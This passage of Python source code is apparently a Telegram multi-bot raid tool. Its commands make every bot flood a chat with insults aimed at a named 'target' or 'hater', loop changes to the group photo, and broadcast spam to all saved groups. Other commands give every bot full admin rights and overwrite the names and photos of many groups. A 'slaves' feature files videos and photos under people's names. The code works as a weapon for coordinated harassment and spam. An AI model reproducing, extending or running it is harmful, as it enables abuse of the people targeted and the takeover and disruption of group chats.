    await update.message.reply_text("\n\n".join(SPAM_TEMPLATE))

@only_sudo
async def spamtarget_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid not in target_names: return await update.message.reply_text("⚠️ 𝐒𝐞𝐭 /target 𝐟𝐢𝐫𝐬𝐭.")
    hater = target_names[cid]
    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
    spam_tasks[cid] = [asyncio.create_task(sequence_spam_loop(bot, cid, hater)) for bot in bots]
    await update.message.reply_text(f"💥 𝐒𝐄𝐐𝐔𝐄𝐍𝐂𝐄 𝐒𝐓𝐀𝐑𝐓𝐄𝐃: {hater}")

@only_sudo
async def stoptarget_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
        del spam_tasks[cid]
    await update.message.reply_text("🛑 𝐓𝐀𝐑𝐆𝐄𝐓 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

# ─────────────────────────────────────────────────
#  SWIPE & REACT COMMANDS
# ─────────────────────────────────────────────────
@only_sudo
async def swipe_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐦𝐬𝐠 𝐚𝐧𝐝 𝐮𝐬𝐞 /swipe!")
    chat_id = update.message.chat_id
    target_msg_id = update.message.reply_to_message.message_id
    if context.args:
        name = " ".join(context.args)
    else:
        ru = update.message.reply_to_message.from_user
        name = ru.first_name if ru else "Target"
    swipe_names[chat_id] = name
    if chat_id in swipe_tasks:
        for t in swipe_tasks[chat_id]: t.cancel()
    async def swipe_loop(bot, cid, tmid, n):
        while True:
            try:
                await bot.send_message(cid, f"{n} {random.choice(RAID_TEXTS)}", reply_to_message_id=tmid)
                await asyncio.sleep(global_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
    swipe_tasks[chat_id] = [asyncio.create_task(swipe_loop(bot, chat_id, target_msg_id, name)) for bot in bots]
    await update.message.reply_text(f"⚔️ 𝐒𝐖𝐈𝐏𝐄 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 𝐎𝐍 {name}!")

@only_sudo
async def stopswipe_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid in swipe_tasks:
        for t in swipe_tasks[cid]: t.cancel()
        del swipe_tasks[cid]
    await update.message.reply_text("🛑 𝐒𝐖𝐈𝐏𝐄 𝐒𝐓𝐎𝐏𝐏𝐄𝐃!")

@only_sudo
async def react_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /react <emoji>")
    react_mode[update.message.chat_id] = context.args[0]
    await update.message.reply_text(f"✅ 𝐑𝐄𝐀𝐂𝐓: {context.args[0]}")

@only_sudo
async def stopreact_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    react_mode.pop(update.message.chat_id, None)
    await update.message.reply_text("🛑 𝐑𝐄𝐀𝐂𝐓 𝐎𝐅𝐅!")

async def dreact_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or len(context.args) < 2:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /dreact <1-10> <emoji1> [emoji2] ...")
    try:
        num_bots = int(context.args[0])
        if num_bots < 1 or num_bots > 10:
            return await update.message.reply_text("⚠️ 𝐍𝐮𝐦: 1–10")
        emojis = context.args[1:]
        chat_id = update.effective_chat.id
        dreact_mode[chat_id] = {"emojis": emojis, "num_bots": min(num_bots, len(bots))}
        await update.message.reply_text(f"✅ 𝐃𝐑𝐄𝐀𝐂𝐓 𝐎𝐍 → {' '.join(emojis)}\n🤖 𝐁𝐨𝐭𝐬: {min(num_bots, len(bots))}")
    except ValueError:
        await update.message.reply_text("⚠️ 𝐅𝐢𝐫𝐬𝐭 𝐚𝐫𝐠 = 𝐧𝐮𝐦𝐛𝐞𝐫")

async def stopdreact_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    dreact_mode.pop(update.effective_chat.id, None)
    await update.message.reply_text("🛑 𝐃𝐑𝐄𝐀𝐂𝐓 𝐒𝐓𝐎𝐏𝐏𝐄𝐃!")

@only_sudo
async def akal_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐭𝐡𝐞 𝐡𝐚𝐭𝐞𝐫!")
    hater_name = swipe_names.get(update.message.chat_id, "Hater")
    await update.message.reply_text(
        f"🚨 {hater_name} 𝐓𝐄𝐑𝐈 𝐀𝐊𝐀𝐋 𝐓𝐇𝐈𝐊𝐀𝐍𝐄 𝐋𝐀𝐆𝐀 𝐃𝐔𝐍𝐆𝐀! 🔥⚡",
        reply_to_message_id=update.message.reply_to_message.message_id
    )

# ─────────────────────────────────────────────────
#  BOT SETTINGS
# ─────────────────────────────────────────────────
@only_sudo
async def changename_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /Changename <name>")
    name = " ".join(context.args)
    count = 0
    from telegram.error import TelegramError
    for b in bots:
        try:
            await b.set_my_name(name=name)
            count += 1
        except TelegramError as e: logger.error(f"TG error: {e}")
        except Exception as e: logger.error(f"Error: {e}")
    await update.message.reply_text(f"✅ 𝐍𝐀𝐌𝐄 𝐂𝐇𝐀𝐍𝐆𝐄𝐃 𝐅𝐎𝐑 {count} 𝐁𝐎𝐓𝐒!")

@only_sudo
async def setpfp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚠️ 𝐁𝐨𝐭 𝐏𝐅𝐏𝐬 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐜𝐡𝐚𝐧𝐠𝐞𝐝 𝐯𝐢𝐚 @BotFather.")

@only_sudo
async def changepfp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.photo:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨.")
    cid, pid = update.message.chat_id, update.message.reply_to_message.photo[-1].file_id
    async def pfp_loop(bot, c, p):
        while True:
            try:
                file = await bot.get_file(p)
                pb = await file.download_as_bytearray()
                await bot.set_chat_photo(c, photo=io.BytesIO(pb))
                await asyncio.sleep(30)
            except asyncio.CancelledError: break
            except Exception as e:
                logger.error(f"PFP: {e}")
                await asyncio.sleep(30)
    if cid in pfp_tasks:
        for t in pfp_tasks[cid]: t.cancel()
    pfp_tasks[cid] = [asyncio.create_task(pfp_loop(bot, cid, pid)) for bot in bots]
    await update.message.reply_text("✅ 𝐏𝐅𝐏 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!")

@only_sudo
async def getallbots_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_usernames:
        return await update.message.reply_text("⚠️ 𝐁𝐨𝐭𝐬 𝐧𝐨𝐭 𝐥𝐨𝐚𝐝𝐞𝐝.")
    await update.message.reply_text("🤖 𝐀𝐋𝐋 𝐁𝐎𝐓𝐒:\n\n" + "\n".join([f"@{u}" for u in bot_usernames]))

# ─────────────────────────────────────────────────
#  GLOBAL SYSTEM
# ─────────────────────────────────────────────────
@only_sudo
async def globalactivate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global global_mode; global_mode = True
    await update.message.reply_text("🌐 𝐆𝐋𝐎𝐁𝐀𝐋 𝐎𝐍 🟢")

@only_sudo
async def offglobal_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global global_mode; global_mode = False
    await update.message.reply_text("🌐 𝐆𝐋𝐎𝐁𝐀𝐋 𝐎𝐅𝐅 🔴")

@only_sudo
async def groups_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not os.path.exists(GROUPS_FILE): return await update.message.reply_text("⚠️ 𝐍𝐨 𝐠𝐫𝐨𝐮𝐩𝐬.")
    with open(GROUPS_FILE, "r") as f: ids = json.load(f)
    titles = []
    for i, gid in enumerate(ids, 1):
        try:
            c = await bots[0].get_chat(gid)
            titles.append(f"{i} — {c.title}")
        except: titles.append(f"{i} — Group {gid}")
    await update.message.reply_text("👥 𝐆𝐑𝐎𝐔𝐏𝐒:\n\n" + "\n".join(titles))

@only_sudo
async def leaveglobal_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    current_chat_id = update.effective_chat.id
    if not os.path.exists(GROUPS_FILE):
        return await update.message.reply_text("⚠️ 𝐍𝐨 𝐠𝐫𝐨𝐮𝐩𝐬.")
    with open(GROUPS_FILE, "r") as f: ids = json.load(f)
    for gid in ids:
        if str(gid) == str(current_chat_id): continue
        for b in bots:
            try: await b.leave_chat(gid)
            except: pass
    new_ids = [gid for gid in ids if str(gid) == str(current_chat_id)]
    with open(GROUPS_FILE, "w") as f: json.dump(new_ids, f)
    await update.message.reply_text("🚪 𝐋𝐄𝐅𝐓 𝐀𝐋𝐋 𝐆𝐂𝐬!")

@only_sudo
async def global_broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global global_mode
    if not global_mode or not context.args: return
    cmd = context.args[0].lower()
    args = context.args[1:]
    with open(GROUPS_FILE, "r") as f: ids = json.load(f)
    for cid in ids:
        if cmd == "spam":
            t = " ".join(args) if args else ALL_SPAM_TEXT
            if cid in spam_tasks:
                for task in spam_tasks[cid]: task.cancel()
            spam_tasks[cid] = [asyncio.create_task(spam_loop(bot, cid, t)) for bot in bots]
        elif cmd == "stop":
            for d in [group_tasks, spam_tasks, pfp_tasks]:
                if cid in d:
                    for task in d[cid]: task.cancel()
                    del d[cid]
    await update.message.reply_text("🌐 𝐆𝐋𝐎𝐁𝐀𝐋 𝐄𝐗𝐄𝐂𝐔𝐓𝐄𝐃")

# ─────────────────────────────────────────────────
#  ADMIN & SUDO COMMANDS
# ─────────────────────────────────────────────────
@only_sudo
async def add_sudo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐮𝐬𝐞𝐫.")
    user = update.message.reply_to_message.from_user
    SUDO_USERS.add(user.id)
    sudo_usernames[str(user.id)] = user.username or user.first_name
    save_sudo()
    await update.message.reply_text(f"✅ @{user.username or user.id} 𝐢𝐬 𝐧𝐨𝐰 𝐒𝐮𝐝𝐨!")

@only_sudo
async def list_sudo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = "🛡️ 𝐒𝐔𝐃𝐎 𝐔𝐒𝐄𝐑𝐒:\n\n"
    for uid in SUDO_USERS:
        uname = sudo_usernames.get(str(uid), "Unknown")
        tag = " (𝐎𝐖𝐍𝐄𝐑)" if uid in OWNER_IDS else ""
        text += f"• @{uname}{tag}\n"
    await update.message.reply_text(text)

@only_sudo
async def del_sudo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /delsudo <username_or_id>")
    target = context.args[0].replace("@", "")
    user_id_to_remove = None
    try:
        if int(target) in SUDO_USERS:
            user_id_to_remove = int(target)
    except ValueError:
        for uid, uname in sudo_usernames.items():
            if uname.lower() == target.lower():
                user_id_to_remove = int(uid); break
    if user_id_to_remove:
        if user_id_to_remove in OWNER_IDS:
            return await update.message.reply_text("❌ 𝐂𝐚𝐧𝐧𝐨𝐭 𝐫𝐞𝐦𝐨𝐯𝐞 𝐎𝐰𝐧𝐞𝐫!")
        SUDO_USERS.remove(user_id_to_remove)
        sudo_usernames.pop(str(user_id_to_remove), None)
        save_sudo()
        await update.message.reply_text(f"✅ {target} 𝐫𝐞𝐦𝐨𝐯𝐞𝐝.")
    else:
        await update.message.reply_text("⚠️ 𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.")

@only_sudo
async def owner_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("@BLACKxGOD\n𝐁𝐋𝐀𝐂𝐊𝐱𝐆𝐎𝐃 ~ 😍👑")

@only_sudo
async def giveadmin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    bot1 = bots[0]
    results = []
    for b in bots[1:]:
        try:
            me = await b.get_me()
            await bot1.promote_chat_member(
                chat_id=cid, user_id=me.id,
                can_manage_chat=True, can_post_messages=True,
                can_edit_messages=True, can_delete_messages=True,
                can_restrict_members=True, can_promote_members=True,
                can_change_info=True, can_invite_users=True, can_pin_messages=True
            )
            results.append(f"✅ @{me.username} → 𝐀𝐝𝐦𝐢𝐧")
        except Exception as e:
            results.append(f"❌ 𝐅𝐚𝐢𝐥: {str(e)}")
    await update.message.reply_text("\n".join(results) if results else "⚠️ 𝐍𝐨 𝐨𝐭𝐡𝐞𝐫 𝐛𝐨𝐭𝐬.")

# ─────────────────────────────────────────────────
#  NEW GROUP + ALL ADMIN COMMANDS
# ─────────────────────────────────────────────────
@only_sudo
async def newgroup_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /newgroup <group name>
    Sabhi bots ke liye Telegram deep links bhejta hai — har link tap karne se
    wo bot us group mein add ho jaata hai. Ek baar sab add ho jayein to /alladmin use karo.
    """
    group_name = " ".join(context.args).strip() if context.args else ""
    payload = group_name.replace(" ", "_") if group_name else "setup"

    wait_msg = await update.message.reply_text("⏳ 𝐋𝐢𝐧𝐤𝐬 𝐛𝐚𝐧 𝐫𝐚𝐡𝐞 𝐡𝐚𝐢𝐧...")

    lines = []
    for i, b in enumerate(bots, 1):
        try:
            me = await b.get_me()
            link = f"https://t.me/{me.username}?startgroup={payload}"
            lines.append(f"🤖 𝐁𝐨𝐭 {i}: @{me.username}\n👉 {link}")
        except Exception as e:
            lines.append(f"❌ 𝐁𝐨𝐭 {i}: {str(e)}")

    header = (
        f"╭━━━━〔 🆕 𝐍𝐄𝐖 𝐆𝐑𝐎𝐔𝐏 𝐒𝐄𝐓𝐔𝐏 〕━━━━╮\n"
        f"│  📛 𝐍𝐚𝐚𝐦: {group_name if group_name else '(koi naam nahi)'}\n"
        f"│  🤖 𝐊𝐮𝐥 𝐁𝐨𝐭𝐬: {len(bots)}\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
        f"⬇️ 𝐇𝐚𝐫 𝐥𝐢𝐧𝐤 𝐭𝐚𝐩 𝐤𝐚𝐫𝐨 → 𝐆𝐫𝐨𝐮𝐩 𝐜𝐡𝐮𝐧𝐨 → 𝐁𝐨𝐭 𝐚𝐝𝐝 𝐡𝐨𝐠𝐚:\n\n"
    )
    footer = (
        "\n\n✅ 𝐒𝐚𝐛 𝐛𝐨𝐭 𝐚𝐝𝐝 𝐡𝐨𝐧𝐞 𝐤𝐞 𝐛𝐚𝐚𝐝 𝐠𝐫𝐨𝐮𝐩 𝐦𝐞𝐢𝐧 𝐥𝐢𝐤𝐡𝐨:\n"
        "👉 /alladmin\n"
        "𝐓𝐨 𝐬𝐚𝐫𝐞 𝐛𝐨𝐭 𝐤𝐨 𝐅𝐔𝐋𝐋 𝐀𝐃𝐌𝐈𝐍 𝐦𝐢𝐥 𝐣𝐚𝐲𝐞𝐠𝐚! 🔥"
    )
    await wait_msg.edit_text(header + "\n\n".join(lines) + footer)

@only_sudo
async def alladmin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /alladmin
    Current group mein saare bots ko FULL ADMIN permissions deta hai.
    Pehle bot ko admin hona chahiye aur 'Add Admins' permission honi chahiye.
    """
    cid = update.message.chat_id
    wait_msg = await update.message.reply_text(
        "⚙️ 𝐒𝐚𝐫𝐞 𝐁𝐨𝐭𝐬 𝐤𝐨 𝐅𝐔𝐋𝐋 𝐀𝐃𝐌𝐈𝐍 𝐝𝐞 𝐫𝐚𝐡𝐚 𝐡𝐚𝐢𝐧... ⏳"
    )

    success = 0
    failed = 0
    result_lines = []

    for i, b in enumerate(bots, 1):
        try:
            me = await b.get_me()
            # Har bot (including khud) ko full admin promote karo
            # Promoter: jo bhi bot ye command chala raha hai
            await context.bot.promote_chat_member(
                chat_id=cid,
                user_id=me.id,
                is_anonymous=False,
                can_manage_chat=True,
                can_post_messages=True,
                can_edit_messages=True,
                can_delete_messages=True,
                can_manage_video_chats=True,
                can_restrict_members=True,
                can_promote_members=True,
                can_change_info=True,
                can_invite_users=True,
                can_pin_messages=True,
            )
            result_lines.append(f"  ✅ 𝐁𝐨𝐭 {i}: @{me.username} → 𝐅𝐔𝐋𝐋 𝐀𝐃𝐌𝐈𝐍 👑")
            success += 1
        except Exception as e:
            err = str(e)
            if "not enough rights" in err.lower() or "not_enough_rights" in err.lower():
                result_lines.append(f"  ❌ 𝐁𝐨𝐭 {i}: 𝐏𝐞𝐡𝐥𝐞 𝐢𝐬𝐞 𝐚𝐝𝐦𝐢𝐧 𝐤𝐚𝐫𝐨!")
            elif "user not found" in err.lower():
                result_lines.append(f"  ⚠️ 𝐁𝐨𝐭 {i}: 𝐆𝐫𝐨𝐮𝐩 𝐦𝐞𝐢𝐧 𝐧𝐚𝐡𝐢𝐧 𝐡𝐚𝐢")
            else:
                result_lines.append(f"  ❌ 𝐁𝐨𝐭 {i}: {err[:60]}")
            failed += 1

    text = (
        "╭━━━━〔 👑 𝐀𝐋𝐋 𝐁𝐎𝐓𝐒 𝐅𝐔𝐋𝐋 𝐀𝐃𝐌𝐈𝐍 〕━━━━╮\n"
        "│\n"
        + "\n".join(result_lines) + "\n"
        "│\n"
        f"│  ✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬: {success}   ❌ 𝐅𝐚𝐢𝐥𝐞𝐝: {failed}\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━╯"
    )
    await wait_msg.edit_text(text)

@only_sudo
async def adminbyp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚡ 𝐀𝐃𝐌𝐈𝐍 𝐁𝐘𝐏𝐀𝐒𝐒 𝐀𝐂𝐓𝐈𝐕𝐄!")

# ─────────────────────────────────────────────────
#  CLONE GROUP COMMAND
# ─────────────────────────────────────────────────
@only_sudo
async def clonegroup_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /clonegroup [target_group_id]
    - Agar group ID diya: sirf us ek group pe current group ka naam+photo+desc apply hoga
    - Agar koi ID nahi diya: GROUPS_FILE ke saare groups pe apply hoga
    Current group mein se naam, description aur photo copy hoti hai.
    """
    src_cid = update.message.chat_id
    wait_msg = await update.message.reply_text("⏳ 𝐂𝐥𝐨𝐧𝐢𝐧𝐠 𝐬𝐡𝐮𝐫𝐮 𝐡𝐨 𝐫𝐚𝐡𝐚 𝐡𝐚𝐢...")

    # ── Source group info fetch ──
    try:
        src_chat = await context.bot.get_chat(src_cid)
        src_title = src_chat.title or ""
        src_desc  = src_chat.description or ""
    except Exception as e:
        return await wait_msg.edit_text(f"❌ 𝐒𝐨𝐮𝐫𝐜𝐞 𝐠𝐫𝐨𝐮𝐩 𝐢𝐧𝐟𝐨 𝐧𝐚𝐡𝐢 𝐦𝐢𝐥𝐢: {e}")

    # ── Source photo bytes fetch ──
    photo_bytes = None
    try:
        if src_chat.photo:
            ph_file = await context.bot.get_file(src_chat.photo.big_file_id)
            photo_bytes = await ph_file.download_as_bytearray()
    except Exception:
        photo_bytes = None

    # ── Target groups list ──
    if context.args:
        # Single target group ID given
        try:
            target_ids = [int(context.args[0])]
        except ValueError:
            return await wait_msg.edit_text("❌ 𝐆𝐫𝐨𝐮𝐩 𝐈𝐃 𝐬𝐡𝐢 𝐧𝐚𝐡𝐢𝐧! 𝐒𝐢𝐫𝐟 𝐧𝐮𝐦𝐛𝐞𝐫 𝐝𝐨.")
    else:
        # All saved groups
        if not os.path.exists(GROUPS_FILE):
            return await wait_msg.edit_text(
                "⚠️ 𝐊𝐨𝐢 𝐬𝐚𝐯𝐞𝐝 𝐠𝐫𝐨𝐮𝐩 𝐧𝐚𝐡𝐢𝐧!\n"
                "𝐔𝐩𝐚𝐲: /clonegroup <group_id> 𝐝𝐨"
            )
        with open(GROUPS_FILE) as f:
            target_ids = json.load(f)
        # Current group exclude karo — usee apply nahi karna
        target_ids = [g for g in target_ids if g != src_cid]
        if not target_ids:
            return await wait_msg.edit_text("⚠️ 𝐊𝐨𝐢 𝐚𝐥𝐚𝐠 𝐠𝐫𝐨𝐮𝐩 𝐧𝐚𝐡𝐢𝐧 𝐦𝐢𝐥𝐚.")

    ok_count = 0
    fail_count = 0
    result_lines = []

    for gid in target_ids:
        line_parts = []
        # ── Title set ──
        try:
            await context.bot.set_chat_title(gid, src_title)
            line_parts.append("📛✅")
        except Exception as e:
            line_parts.append(f"📛❌({str(e)[:30]})")

        # ── Description set ──
        try:
            await context.bot.set_chat_description(gid, src_desc)
            line_parts.append("📝✅")
        except Exception:
            line_parts.append("📝❌")

        # ── Photo set ──
        if photo_bytes:
            try:
                await context.bot.set_chat_photo(gid, photo=io.BytesIO(bytes(photo_bytes)))
                line_parts.append("🖼️✅")
            except Exception:
                line_parts.append("🖼️❌")
        else:
            line_parts.append("🖼️⚠️(no photo)")

        status = "✅" if "❌" not in " ".join(line_parts) else "⚠️"
        result_lines.append(f"  {status} {gid}: {' '.join(line_parts)}")
        if "❌" not in " ".join(line_parts):
            ok_count += 1
        else:
            fail_count += 1

        await asyncio.sleep(0.5)   # Rate limit se bachne ke liye

    photo_status = "✅ 𝐌𝐢𝐥𝐢" if photo_bytes else "⚠️ 𝐍𝐚𝐡𝐢𝐧 𝐦𝐢𝐥𝐢"
    text = (
        "╭━━━━〔 🔁 𝐂𝐋𝐎𝐍𝐄 𝐆𝐑𝐎𝐔𝐏 𝐑𝐈𝐏𝐎𝐑𝐓 〕━━━━╮\n"
        "│\n"
        f"│  📛 𝐍𝐚𝐚𝐦   : {src_title}\n"
        f"│  📝 𝐃𝐞𝐬𝐜   : {src_desc[:40] + '...' if len(src_desc) > 40 else (src_desc or 'Koi nahi')}\n"
        f"│  🖼️  𝐏𝐡𝐨𝐭𝐨  : {photo_status}\n"
        f"│  🎯 𝐓𝐚𝐫𝐠𝐞𝐭 : {len(target_ids)} 𝐆𝐫𝐨𝐮𝐩𝐬\n"
        "│\n"
        + "\n".join(result_lines) + "\n"
        "│\n"
        f"│  ✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬: {ok_count}   ❌ 𝐅𝐚𝐢𝐥: {fail_count}\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
    )
    await wait_msg.edit_text(text)

# ─────────────────────────────────────────────────
#  SLAVES
# ─────────────────────────────────────────────────
@only_sudo
async def slaves_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not slaves_list:
        return await update.message.reply_text("⚠️ 𝐍𝐨 𝐬𝐥𝐚𝐯𝐞𝐬.")
    lines = []
    for i, s in enumerate(slaves_list, 1):
        name = s["name"] if isinstance(s, dict) else s
        vcount = len(s.get("videos", [])) if isinstance(s, dict) else 0
        lines.append(f"{i}. {name} [{vcount} 🎥]")
    await update.message.reply_text("⛓️ 𝐒𝐋𝐀𝐕𝐄𝐒:\n\n" + "\n".join(lines))

@only_sudo
async def addslave_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /addslave <name>")
    name = " ".join(context.args)
    slaves_list.append({"name": name, "videos": []})
    save_slaves()
    await update.message.reply_text(f"✅ 𝐒𝐥𝐚𝐯𝐞 𝐚𝐝𝐝𝐞𝐝: {name}")

@only_sudo
async def delslave_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /delslave <name>")
    name = " ".join(context.args)
    global slaves_list
    before = len(slaves_list)
    slaves_list = [s for s in slaves_list if (s["name"] if isinstance(s, dict) else s) != name]
    save_slaves()
    if len(slaves_list) < before:
        await update.message.reply_text(f"✅ {name} 𝐫𝐞𝐦𝐨𝐯𝐞𝐝.")
    else:
        await update.message.reply_text("⚠️ 𝐍𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.")

@only_sudo
async def showslave_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /showslave <num>")
    try:
        num = int(context.args[0])
        if num < 1 or num > len(slaves_list):
            return await update.message.reply_text("⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫.")
        slave = slaves_list[num - 1]
        if isinstance(slave, str): slave = {"name": slave, "videos": []}
        name = slave["name"]
        videos = slave.get("videos", [])
        if not videos:
            return await update.message.reply_text(f"⚠️ {name} 𝐡𝐚𝐬 𝐧𝐨 𝐯𝐢𝐝𝐞𝐨𝐬.")
        for v in videos:
            try:
                cap = v.get("caption", "") if isinstance(v, dict) else ""
                fid = v["file_id"] if isinstance(v, dict) else v
                await update.message.reply_video(fid, caption=cap or None)
            except: pass
    except (ValueError, IndexError):
        await update.message.reply_text("⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝.")

@only_sudo
async def saveslave_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /saveslave <num>")
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐯𝐢𝐝𝐞𝐨/𝐩𝐡𝐨𝐭𝐨!")
    try:
        num = int(context.args[0])
        if num < 1 or num > len(slaves_list):
            return await update.message.reply_text("⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫.")
    except: return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /saveslave <num>")
    msg = update.message.reply_to_message
    caption = " ".join(context.args[1:]) if len(context.args) > 1 else (msg.caption or "")
    if msg.video: file_id = msg.video.file_id
    elif msg.photo: file_id = msg.photo[-1].file_id
    else: return await update.message.reply_text("⚠️ 𝐍𝐨 𝐯𝐢𝐝𝐞𝐨/𝐩𝐡𝐨𝐭𝐨 𝐟𝐨𝐮𝐧𝐝!")
    slave = slaves_list[num - 1]
    if not isinstance(slave, dict): slaves_list[num - 1] = {"name": slave, "videos": []}; slave = slaves_list[num - 1]
    if "videos" not in slave: slave["videos"] = []
    slave["videos"].append({"file_id": file_id, "caption": caption})
    save_slaves()
    await update.message.reply_text(f"✅ 𝐒𝐚𝐯𝐞𝐝 𝐭𝐨 {slave['name']}! 𝐓𝐨𝐭𝐚𝐥: {len(slave['videos'])} 🎥")

# ─────────────────────────────────────────────────
#  LAYOUT COMMANDS
# ─────────────────────────────────────────────────
@only_sudo
async def setlayout_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global custom_layout
    if not context.args:
        current = custom_layout if custom_layout else "𝐃𝐞𝐟𝐚𝐮𝐥𝐭"
        return await update.message.reply_text(f"⚠️ 𝐔𝐬𝐚𝐠𝐞: /Setlayout <text>\n\n𝐂𝐮𝐫𝐫𝐞𝐧𝐭:\n{current}")
    custom_layout = " ".join(context.args)
    with open(LAYOUT_FILE, "w") as f: json.dump({"layout": custom_layout}, f)
    await update.message.reply_text(f"✅ 𝐋𝐀𝐘𝐎𝐔𝐓 𝐔𝐏𝐃𝐀𝐓𝐄𝐃!\n\n{custom_layout}")

@only_sudo
async def resetlayout_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global custom_layout
    custom_layout = ""
    if os.path.exists(LAYOUT_FILE): os.remove(LAYOUT_FILE)
    await update.message.reply_text("🔄 𝐋𝐀𝐘𝐎𝐔𝐓 𝐑𝐄𝐒𝐄𝐓! ✅")

# ─────────────────────────────────────────────────
#  MASTER CONTROL
# ─────────────────────────────────────────────────
@only_sudo
async def stop_all_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    for d in [group_tasks, spam_tasks, pfp_tasks, swipe_tasks, fight_tasks]:
        if cid in d:
            for t in d[cid]: t.cancel()
            del d[cid]
    react_mode.pop(cid, None)
    dreact_mode.pop(cid, None)
    await update.message.reply_text("🛑 𝐄𝐕𝐄𝐑𝐘𝐓𝐇𝐈𝐍𝐆 𝐒𝐓𝐎𝐏𝐏𝐄𝐃! 💀")

@only_sudo
async def refresh_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    for d in [group_tasks, spam_tasks, pfp_tasks, swipe_tasks]:
        for cid in list(d.keys()):
            for t in d[cid]: t.cancel()
            del d[cid]
    react_mode.clear(); dreact_mode.clear()
    await update.message.reply_text("✅ 𝐀𝐋𝐋 𝐓𝐀𝐒𝐊𝐒 𝐑𝐄𝐅𝐑𝐄𝐒𝐇𝐄𝐃! 🚀")

# ─────────────────────────────────────────────────
#  UTILITY COMMANDS
# ─────────────────────────────────────────────────
async def ping_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🏓 𝐏𝐎𝐍𝐆! ✅")

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        grp_count = len(json.load(open(GROUPS_FILE))) if os.path.exists(GROUPS_FILE) else 0
    except: grp_count = 0
